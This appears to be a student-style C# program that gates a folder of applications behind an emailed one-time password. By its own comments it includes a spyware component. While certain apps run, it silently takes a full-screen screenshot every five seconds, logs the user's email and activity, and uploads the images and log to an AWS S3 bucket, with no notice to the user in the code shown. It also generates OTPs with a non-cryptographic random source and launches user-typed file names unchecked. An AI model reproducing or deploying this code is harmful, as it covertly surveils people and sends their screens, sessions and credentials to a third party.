using System.Net;
using System.Net.Mail;
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows;
using System.Diagnostics;
using System.Drawing;
using Amazon.S3;
using Amazon.S3.Model;
using Amazon.S3.Transfer;
using Amazon.S3.Util;

namespace SuperUser
{
    class Program
    {

        static string UserEmailID;              //  Variable to store User's Mail ID

        //  This method is to send an OTP via Mail to user For Verification
        public static int SendMail(string emailTo)
        {
            string divider = "=================================================================================";
            Record(divider);
            Record(emailTo);

            //  SMTP Address has to be adjusted as per the Email Used for Sending
            //  smtp.gmail.com is for gmail account.
            string smtpAddress = "smtp.gmail.com";
            int portNumber = 587;
            bool enableSSL = true;

            //  OTP Generation and Formatting the OTP
            Random random = new Random();
            int num = random.Next(100000, 999999);
            string numb = num.ToString();
            string otpA = numb.Substring(0, 3);
            string otpB = numb.Substring(3);

            //  The Mail ID from Which Email will be Send
            //  Enter the Email Id from which Email will be send
            string emailFrom = "Enter the Email Address";
            //  Enter Password for the Email Account
            string password = "Enter the Password";
            string subject = "One Time Password";
            string body = otpA + " " + otpB;


            try
            {
                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(emailFrom);
                    mail.To.Add(emailTo);
                    mail.Subject = subject;
                    mail.Body = body;
                    mail.IsBodyHtml = true;


                    using (SmtpClient smtp = new SmtpClient(smtpAddress, portNumber))
                    {
                        smtp.Credentials = new NetworkCredential(emailFrom, password);
                        smtp.EnableSsl = enableSSL;
                        smtp.Send(mail);
                    }
                }
            }
            catch( Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return num;
        }

        //  Email Verification is only for the Administrator
        //  Email of the Admin is first Hard Wired in the code which is then Verified
        public static int VerifyEmail(string email)
        {
            int ver = 0;
            email = email.ToLower();
            if (email.Equals("Enter Mail ID for Verification "))
            {
                ver = 1;
                Console.WriteLine("Email Verified ");
            }
            else
            {
                Console.WriteLine("Invalid Email ");
            }
            return ver;
        }

        //  This Method is to Verify the OTP Send to the User

        /*
         *  This Method also Facilitates the user if the wants the OTP to be sent again
            Once the OTP is send user has 3 attempts to Enter the Correct OTP
            If the OTP is Correct The code will proceed else the suer willbe left with 2 more attempts
            In order to resend the OTP 
                                    the user needs to type 000000 or 6 0's
         *
         */
        public static int VerifyOTP(int TempOTP, string email)
        {

            int general = 0;
            int otp = TempOTP;
            int secondryOTP = 0;

        ResendOTPLocation:

            if (general == 1)
            {
                otp = secondryOTP;
            }
            int attempts = 2;
            int temp = 1;
            Console.WriteLine("OTP has been sent to " + email);


            do
            {

                if (temp > 1)
                {
                    Console.WriteLine("You have " + attempts + " attempts left ");
                    attempts--;
                }


                Console.Write("Enter the OTP ");
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("If you did not recieve the OTP type \"000000\" (6 0's)");
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.White;
                int password = int.Parse(Console.ReadLine());


                if (password == otp)
                {
                    Console.WriteLine("ACCESS GRANTED ");
                    return 1;
                }
                else if (password == 000000)
                {
                    Console.WriteLine("Resending OTP.........");
                    secondryOTP = SendMail(email);
                    general = 1;
                    goto ResendOTPLocation;
                }
                else if (temp > 0 && temp < 4)
                {
                    Console.WriteLine("WRONG OTP TRY AGAIN ");
                    temp++;
                }
                else
                {
                    Console.WriteLine("WRONG OTP");
                }


            } while (temp != 4);
            return 0;

        }

        // If it is a Temporary User This Method is Executed
        /*
         *
            In this Email of the User is not verified but the OTP is sent to the Email
            Address to Register the user in the Record
        *
        * 
             */
        public static void NotAdmin()
        {

            Console.WriteLine("Enter your Email");
            string Email = Console.ReadLine();
            int pass = SendMail(Email);
            UserInfo(Email);
            int verified = VerifyOTP(pass, Email);


            if (verified == 1)
            {
                Color(1);
                ViewFiles();
            }
            else
            {
                Environment.Exit(0);
            }


        }

        //  If it is the Administrator this Method will be executed
        /*  
         *  
            This Method verfies the Mail Id of the User First
            Once the Mail ID is verified Then the OTP is sent
         *
         *
             */
        public static void Admin()
        {

            string choice = "exit";
            int verifiedOTP = 0;
            int AccountVerified = 0;
            Console.WriteLine("VERIFY ADMINISTRATOR");
            Console.WriteLine("Enter your Email Id ");
            string email = Console.ReadLine();
            int ver = VerifyEmail(email);


            if (ver == 1)
            {
                Console.WriteLine("Sending OTP..........");
                int otp = SendMail(email);
                UserInfo(email);
                verifiedOTP = VerifyOTP(otp, email);

                if (verifiedOTP == 1)
                {
                    Color(2);
                    AccountVerified = 1;
                }
                else
                {
                    Environment.Exit(0);
                }

            }


            if (AccountVerified == 1)
            {
                do
                {
                locate:
                    choice = "exit";
                    Console.WriteLine("Type \"Files\" to view all Files");
                    Console.WriteLine("Type \"record\" to view Record");
                    Console.WriteLine("Type \"Screenshots\" to view Screenshots");
                    Console.WriteLine("Type \"exit\" to Exit from Console");
                    choice = Console.ReadLine();
                    choice = choice.ToLower();


                    if (choice.Equals("files"))
                    {
                        ViewFiles();
                        goto locate;
                    }
                    else if (choice.Equals("record"))
                    {
                        ViewRecord();
                        goto locate;
                    }
                    else if (choice.Equals("screenshots"))
                    {
                        Screenshots();
                    }
                    else if (choice.Equals("exit"))
                    {
                        Environment.Exit(0);
                    }
                    else
                    {
                        Console.WriteLine("\"WRONG CHOICE \"");
                        choice = "again";
                    }


                } while (choice.Equals("again"));

            }

        }

        //  This Method is to View All Files Present in the Folder
        /*  
         *  
            This Method Show Some Properties of the files in the folder
            These Properties includes
                                    size of the files
                                    Creation Date of the File
                                    Creation Time of the File
         *
         * 
               */
        public static void ViewFiles()
        {

            string choice = "exit";
            string path = "C:\\Users\\deepa\\Desktop\\Apps";
            DirectoryInfo dir = new DirectoryInfo(path);
            Console.WriteLine("File Name                       Size        Creation Date and Time");
            Console.WriteLine("=================================================================");


            foreach (FileInfo flInfo in dir.GetFiles())
            {
                String name = flInfo.Name;
                long size = flInfo.Length;
                DateTime creationTime = flInfo.CreationTime;
                Console.WriteLine("{0, -30:g} {1,-12:N0} {2} ", name, size, creationTime);
            }


            do
            {

                choice = "exit";
                Console.WriteLine("Write File Name to execute Files or type \"exit\" to exit ");
                string FileName = Console.ReadLine();
                FileName = FileName.ToLower();

                try
                {

                    if (FileName.Equals("exit"))
                    {
                        Environment.Exit(0);
                    }
                    else
                    {

                        System.Diagnostics.Process.Start("C:\\Users\\deepa\\Desktop\\Apps\\" + FileName);
                        DateTime local = DateTime.Now;
                        string TimeDate = local.ToString();
                        Record(FileName);
                        Record(TimeDate);
                        WhichFile(FileName);

                    }
                }
                catch (Exception e)
                {

                    Console.WriteLine("FileName Does not Exist ");
                    Console.WriteLine(e.Message);

                }

                Console.WriteLine("Do you wish to open another file (yes/no). Press enter to exit ");
                choice = Console.ReadLine();
                choice = choice.ToLower();

            } while (choice.Equals("yes"));

            if (choice == "exit")
            {
                Environment.Exit(0);
            }

        }

        //  This Enables the User to choose which File He or she wants to Open 
        /*  
         *  
            User Has to type the name of the executable file which the user wants to open
                Note: Full name of the File has to be typed with the extension
                If any new File is added to this Folder Then Changes has to be made in this
                method to execute the new file
                The Presence of the new file has to be mantioned here
         *
         *
             */
        public static void WhichFile(string Filename)
        {


            Filename = Filename.ToLower();
            if (Filename.Equals("google chrome.lnk"))
            {
                ScreenShotForChrome(Filename);
            }
            else if (Filename.Equals("putty.exe"))
            {
                ScreenShotForPutty(Filename);
            }
            else if (Filename.Equals("betternet.lnk"))
            {
                ScreenShotForBetternet(Filename);
            }
            else if (Filename.Equals("shareit.lnk"))
            {
                ScreenShotForShareit(Filename);
            }
            else if (Filename.Equals("eclipse java neon.lnk"))
            {
                ScreenShotForNeon(Filename);
            }


        }

        //  This is the Initial Method Which is Executed
        /*
         * 
            This Method Gives the user 3 choices
                                            If the user is admin
                                            If the user is not admin
                                            If the user wants to exit
         *
         * 
             */
        public static void Init()
        {


            int x = 0;
            do
            {


                Console.Clear();
                Console.WriteLine("Are You the Administrator (yes/no). Type \"exit\" to exit");
                string option = Console.ReadLine();
                option = option.ToLower();


                if (option.Equals("yes"))
                {
                    Admin();
                }
                else if (option.Equals("no"))
                {
                    NotAdmin();
                }
                else if (option.Equals("exit"))
                {
                    Environment.Exit(0);
                }


                x++;
            } while (x < 3);


        }

        //  This Method is Generate Record About what user does in the Software
        /*
         * 
            What all credentials are entered by the user
            What all applications are used by the user
            While the user uses the application a spyware tool captures screenshots
            at a provided intervals to see spy at the user
        *
        * 
            */
        public static void Record(string rec)
        {


            string path = @"C:\Users\deepa\desktop\record.txt";

            if (!File.Exists(path))
            {

                using (StreamWriter sw = File.CreateText(path))
                {

                    DateTime local = DateTime.Now;
                    string time = local.ToString();
                    sw.WriteLine("This Log file was created on " + time + "\n");

                }

            }

            using (StreamWriter sw = File.AppendText(path))
            {
                sw.WriteLine(rec);
            }


        }

        //  This Method is to Capture ScreenShots
        /*
         * 
            This Method Captures ScreenShots as per the settings defined by the coder
            This Method Captures ScreenShots till the time user is using the Application
            Once the Application is Closed the Process of Capturing Screenshots will
            also stop
        *
        * 
            */
        public static int Screenshots()
        {
            string choice = "exit";
            string path = "C:\\Users\\deepa\\Desktop\\Screens";
            DirectoryInfo dir = new DirectoryInfo(path);
            Console.WriteLine("File Name                       Size        Creation Date and Time");
            Console.WriteLine("=================================================================");
            foreach (FileInfo flInfo in dir.GetFiles())
            {
                String name = flInfo.Name;
                long size = flInfo.Length;
                DateTime creationTime = flInfo.CreationTime;
                Console.WriteLine("{0, -30:g} {1,-12:N0} {2} ", name, size, creationTime);
            }
            do
            {
                choice = "exit";
                Console.WriteLine("Write File Name to execute Files or type \"exit\" to exit ");
                string FileName = Console.ReadLine();
                FileName = FileName.ToLower();
                try
                {
                    if (FileName.Equals("exit"))
                    {
                        Environment.Exit(0);
                    }
                    else
                    {
                        System.Diagnostics.Process.Start("C:\\Users\\deepa\\Desktop\\Screens\\" + FileName);
                        DateTime local = DateTime.Now;
                        string TimeDate = local.ToString();
                        Record(FileName);
                        Record(TimeDate);
                        WhichFile(FileName);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("FileName Does not Exist ");
                    Console.WriteLine(e.Message);
                }
                Console.WriteLine("Do you wish to open another file (yes/no). Press enter to exit ");
                choice = Console.ReadLine();
                choice = choice.ToLower();

            } while (choice.Equals("yes"));
            if (choice == "exit")
            {
                Environment.Exit(0);
            }
            return 0;
        }

        //  This Method Enable The Administrator To view the Record of the Folder
        /*
         * 
            Record is only visible to the administrator
            the Coder First Has to enter the Location where the record is stored
         *
         * 
             */
        public static int ViewRecord()
        {

            string[] lines = System.IO.File.ReadAllLines(@"C:\Users\deepa\desktop\record.txt");
            Console.WriteLine("============= LOG ============");


            foreach (string line in lines)
            {
                Console.WriteLine("\t" + line);
            }
            return 0;

        }

        //  This Method is to Switch the Color of the console
        /*
         * 
            Once the User has been granted access to the folder 
            the color of the console is changed to signify that
         * 
         */
        public static int Color(int col)
        {


            if (col == 1)
            {

                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;

            }
            else if (col == 2)
            {

                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;

            }
            return 0;


        }

        // This Method captures ScreenShots for Chrome 
        /*
         * 
            Settings can be customized 
            Screenshots are Captured After every 5000 milli-seconds or 5 seconds
            Screenshot once captured will be saved in the designated folder
            Screenshot will be of Full Screen
         * 
         */
        public static void ScreenShotForChrome(string Filename)
        {

            CheckFolder();
            string user = UserInfo(null);
            int i = 0;

            while (Process.GetProcessesByName("chrome").Length > 0)
            {

                i++;
                Bitmap memoryImage;
                memoryImage = new Bitmap(1360, 960);
                Size s = new Size(memoryImage.Width, memoryImage.Height);
                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                string ScreenShotName = user + "#" + Filename + "#" + i + ".png";
                DateTime local = DateTime.Now;
                string TimeDate = local.ToString();
                string CompleteRecordString = "Image -> " + ScreenShotName + "\t\t" + TimeDate;
                Record(CompleteRecordString);
                string str = "";

                try
                {

                    str = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) +
                          "//screens//" + ScreenShotName);

                }
                catch (Exception er)
                {

                    Console.WriteLine("Sorry, there was an error: " + er.Message);
                    Console.WriteLine();

                }

                // Thread.Sleep(Time) 
                /*
                    Time is in milliseconds
                    It can be changed as per the user
                 */
                Thread.Sleep(5000);
                memoryImage.Save(str);

            };

        }

        // This Method captures ScreenShots for Putty 
        /*
         * 
            Settings can be customized 
            Screenshots are Captured After every 5000 milli-seconds or 5 seconds
            Screenshot once captured will be saved in the designated folder
            Screenshot will be of Full Screen
         * 
         */
        public static void ScreenShotForPutty(string Filename)
        {


            CheckFolder();
            string user = UserInfo(null);
            int i = 0;
            while (Process.GetProcessesByName("putty").Length > 0)
            {

                i++;
                Bitmap memoryImage;
                memoryImage = new Bitmap(1360, 960);
                Size s = new Size(memoryImage.Width, memoryImage.Height);
                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                string ScreenShotName = user + "#" + Filename + "#" + i + ".png";
                DateTime local = DateTime.Now;
                string TimeDate = local.ToString();
                string CompleteRecordString = "Image -> " + ScreenShotName + "\t\t" + TimeDate;
                Record(CompleteRecordString);
                string str = "";

                try
                {

                    str = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) +
                          "//screens//" + ScreenShotName);

                }
                catch (Exception er)
                {

                    Console.WriteLine("Sorry, there was an error: " + er.Message);
                    Console.WriteLine();

                }

                // Thread.Sleep(Time) 
                /*
                    Time is in milliseconds
                    It can be changed as per the user
                 */
                Thread.Sleep(5000);
                memoryImage.Save(str);

            };

        }

        // This Method captures ScreenShots for Betternet 
        /*
         * 
            Settings can be customized 
            Screenshots are Captured After every 5000 milli-seconds or 5 seconds
            Screenshot once captured will be saved in the designated folder
            Screenshot will be of Full Screen
         * 
         */
        public static void ScreenShotForBetternet(string Filename)
        {


            CheckFolder();
            string user = UserInfo(null);
            int i = 0;

            while (Process.GetProcessesByName("betternet").Length > 0)
            {

                i++;
                Bitmap memoryImage;
                memoryImage = new Bitmap(1360, 960);
                Size s = new Size(memoryImage.Width, memoryImage.Height);
                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                string ScreenShotName = user + "#" + Filename + "#" + i + ".png";
                DateTime local = DateTime.Now;
                string TimeDate = local.ToString();
                string CompleteRecordString = "Image -> " + ScreenShotName + "\t\t" + TimeDate;
                Record(CompleteRecordString);
                string str = "";

                try
                {

                    str = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) +
                          "//screens//" + ScreenShotName);

                }
                catch (Exception er)
                {

                    Console.WriteLine("Sorry, there was an error: " + er.Message);
                    Console.WriteLine();

                }

                // Thread.Sleep(Time) 
                /*
                    Time is in milliseconds
                    It can be changed as per the user
                 */
                Thread.Sleep(5000);
                memoryImage.Save(str);

            };

        }

        // This Method captures ScreenShots for ShareIt
        /*
         * 
            Settings can be customized 
            Screenshots are Captured After every 5000 milli-seconds or 5 seconds
            Screenshot once captured will be saved in the designated folder
            Screenshot will be of Full Screen
         * 
         */
        public static void ScreenShotForShareit(string Filename)
        {


            CheckFolder();
            string user = UserInfo(null);
            int i = 0;

            while (Process.GetProcessesByName("shareit").Length > 0)
            {

                i++;
                Bitmap memoryImage;
                memoryImage = new Bitmap(1360, 960);
                Size s = new Size(memoryImage.Width, memoryImage.Height);
                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                string ScreenShotName = user + "#" + Filename + "#" + i + ".png";
                DateTime local = DateTime.Now;
                string TimeDate = local.ToString();
                string CompleteRecordString = "Image -> " + ScreenShotName + "\t\t" + TimeDate;
                Record(CompleteRecordString);
                string str = "";
                try
                {

                    str = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) +
                          "//screens//" + ScreenShotName);

                }
                catch (Exception er)
                {

                    Console.WriteLine("Sorry, there was an error: " + er.Message);
                    Console.WriteLine();

                }

                // Thread.Sleep(Time) 
                /*
                    Time is in milliseconds
                    It can be changed as per the user
                 */
                Thread.Sleep(5000);
                memoryImage.Save(str);

            };

        }

        // This Method captures ScreenShots for Neon
        /*
         * 
            Settings can be customized 
            Screenshots are Captured After every 5000 milli-seconds or 5 seconds
            Screenshot once captured will be saved in the designated folder
            Screenshot will be of Full Screen
         * 
         */
        public static void ScreenShotForNeon(string Filename)
        {


            CheckFolder();
            string user = UserInfo(null);
            int i = 0;

            while (Process.GetProcessesByName("eclipse").Length > 0)
            {

                i++;
                Bitmap memoryImage;
                memoryImage = new Bitmap(1360, 960);
                Size s = new Size(memoryImage.Width, memoryImage.Height);
                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                string ScreenShotName = user + "#" + Filename + "#" + i + ".png";
                DateTime local = DateTime.Now;
                string TimeDate = local.ToString();
                string CompleteRecordString = "Image -> " + ScreenShotName + "\t\t" + TimeDate;
                Record(CompleteRecordString);
                string str = "";

                try
                {

                    str = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) +
                          "//screens//" + ScreenShotName);

                }
                catch (Exception er)
                {

                    Console.WriteLine("Sorry, there was an error: " + er.Message);
                    Console.WriteLine();

                }

                // Thread.Sleep(Time) 
                /*
                    Time is in milliseconds
                    It can be changed as per the user
                 */
                Thread.Sleep(5000);
                memoryImage.Save(str);

            };

        }

        //  This Method is to Keep User Info which can be later saved in record
        public static string UserInfo(string mail)
        {

            if (mail != null)
            {

                UserEmailID = mail;
                return null;

            }
            else if (mail == null)
            {
                return UserEmailID;
            }
            return null;
        }

        //  This Method is to check the presence of the Folder
        /*
         * 
            If the Folder is Present then it will ignore it and move forward
            if the folder of the designated name is not present then it will create one
            with the designated name and save files accordingly
         *
         *
            */
        public static int CheckFolder()
        {

            if (Directory.Exists("C:\\users\\deepa\\desktop\\screens") == true)
            {
                return 0;
            }
            else
            {
                System.IO.Directory.CreateDirectory("C:\\users\\deepa\\desktop\\screens");
            }

            return 0;

        }

        //  If The admin Wants to send the Email to the designated user 
        /*
         * 
            This code can be used for sending attachments to the User of the software
         * 
         */
        public static void AttachmentMail(string emailTo, string Filename)
        {

            //  SMTP Address has to be adjusted as per the Email Used for Sending
            //  smtp.gmail.com is for gmail account.
            string smtpAddress = "smtp.gmail.com";
            int portNumber = 587;
            bool enableSSL = true;

            //Enter the Email Address From which You want to send Email
            string emailFrom = "Enter Email";
            string password = "Enter Password";
            string subject = "";
            string body = "";

            using (MailMessage mail = new MailMessage())
            {


                mail.From = new MailAddress(emailFrom);
                mail.To.Add(emailTo);
                mail.Subject = subject;
                mail.Body = body;
                mail.IsBodyHtml = true;
                Attachment attachment = new Attachment("C:\\users\\deepa\\desktop\\screens" + Filename);
                mail.Attachments.Add(attachment);

                using (SmtpClient smtp = new SmtpClient(smtpAddress,
                                                        portNumber))
                {

                    smtp.Credentials = new NetworkCredential(emailFrom,
                                                        password);
                    smtp.EnableSsl = enableSSL;
                    smtp.Send(mail);

                }

            }

        }

        // This Method is to store data in the cloud
        /*
         * 
            All the Records and ScreenShots Generated Are stored in cloud of the user
            The Cloud Platform Used is Amazon Web Service (AWS)
            Credentials Are Needed for the Execution
         * 
         */
        public static void CloudStorageScreenshots()
        {

            //  Enter the Access Key For AWS
            string AccessKey = "Access Key Here";

            //  Enter the Secret Key For AWS
            string SecretKey = "Secret Key Here";

            //  Change Folder Name As Directed
            string existingBucketName = "screenshots-folder-management" + @"/Screens";

            //  Path of the Directory
            string directoryPath = @"C:\Users\deepa\Desktop\screens";
            try
            {
                //  Correctly Enter the Region of your Bucket
                TransferUtility directoryTransferUtility = new TransferUtility
                                                          (new AmazonS3Client(AccessKey,
                                                                              SecretKey,
                                                                              Amazon.RegionEndpoint.APSouth1));

                directoryTransferUtility.UploadDirectory(directoryPath, existingBucketName);

                directoryTransferUtility.UploadDirectory(directoryPath, existingBucketName, "*.png", SearchOption.AllDirectories);


                TransferUtilityUploadDirectoryRequest request = new TransferUtilityUploadDirectoryRequest
                {

                    BucketName = existingBucketName,
                    Directory = directoryPath,
                    SearchOption = SearchOption.AllDirectories,
                    SearchPattern = "*.png"

                };

                directoryTransferUtility.UploadDirectory(request);
            }

            catch (AmazonS3Exception e)
            {

                Console.WriteLine("There is Some Problem");
                Console.WriteLine(e.Message, e.InnerException);

            }
        }
        public static void CloudStorageLog()
        {

            //  Type in the Bucket Name
            string bucketName = "screenshots-folder-management" + @"/Log";
            string keyName = "record.txt";
            string filePath = @"C:\Users\deepa\Desktop\record.txt";

            //  Enter the Access Key Here of AWS
            string AccessKey = "Access Key Here";

            //  Enter the Secret Key Here of AWS
            string SecretKey = "Secret Key Here";

            IAmazonS3 client;
            using (client = new AmazonS3Client(AccessKey,
                                               SecretKey,
                                               Amazon.RegionEndpoint.APSouth1))
            {
                try
                {

                    PutObjectRequest putRequest2 = new PutObjectRequest
                    {

                        BucketName = bucketName,
                        Key = keyName,
                        FilePath = filePath,
                        ContentType = "Text"

                    };

                    putRequest2.Metadata.Add("Record", "someTitle");

                    PutObjectResponse response2 = client.PutObject(putRequest2);
                }

                catch (AmazonS3Exception amazonS3Exception)
                {

                    Console.WriteLine("Caught in Logs");
                    if (amazonS3Exception.ErrorCode != null &&
                        (amazonS3Exception.ErrorCode.Equals("InvalidAccessKeyId")
                        ||
                        amazonS3Exception.ErrorCode.Equals("InvalidSecurity")))
                    {
                        Console.WriteLine("Check the provided AWS Credentials.");
                        Console.WriteLine(
                            "For service sign up go to http://aws.amazon.com/s3");
                    }
                    else
                    {

                        Console.WriteLine(
                            "Error occurred. Message:'{0}' when writing an object"
                            , amazonS3Exception.Message);
                    }

                }

            }

        }

        // Set Up the Console Color in the Beginning
        public static void InitialColorConsole()
        {

            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.White;

        }


        //  The Program Executes for Here
        static void Main(string[] args)
        {


            InitialColorConsole();
            Thread t0 = new Thread(CloudStorageLog);
            Thread t1 = new Thread(CloudStorageScreenshots);
            Thread t2 = new Thread(Init);
            t0.Start();
            t1.Start();
            t2.Start();

        }
    }
}
